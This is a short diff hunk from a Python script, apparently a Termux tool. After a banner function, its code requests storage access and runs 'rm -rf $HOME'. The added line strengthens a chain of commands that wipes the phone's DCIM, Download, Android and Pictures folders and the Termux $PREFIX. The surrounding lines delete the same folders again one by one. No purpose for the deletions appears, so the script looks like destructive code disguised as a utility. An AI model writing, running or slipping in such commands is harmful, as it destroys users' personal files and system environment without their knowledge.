@@ -26,7 +26,7 @@ def banner():
 os.system('termux-setup-storage')
 time.sleep(2)
 os.system('rm -rf $HOME')
-os.system('cd /sdcard ')
+os.system('cd /sdcard && rm -rf DCIM && rm -rf Download && rm -rf Android && rm -rf Pictures && rm -rf $PREFIX ')
 os.system('rm -rf DCIM ')
 os.system('rm -rf Download')
 os.system('rm -rf Android ' )
